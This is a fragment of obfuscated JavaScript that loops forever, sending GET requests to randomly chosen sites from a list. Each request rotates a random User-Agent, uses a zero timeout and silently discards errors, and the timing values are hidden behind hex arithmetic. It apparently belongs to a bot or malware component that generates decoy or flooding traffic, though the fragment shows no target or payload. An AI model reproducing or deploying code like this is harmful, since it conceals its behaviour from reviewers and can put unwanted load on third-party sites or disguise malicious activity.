      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x11d1 * 0x1 + 0x13f * 0x17 + -0x1f * 0x9e) * getRandomInt(0x5b + -0x4 * -0x5e3 + -0x17e6, -0x113 * 0x11 + 0x148 + 0x11 * 0x100));
}, 0x46 * 0x23 + -0x21c6 + 0x1898);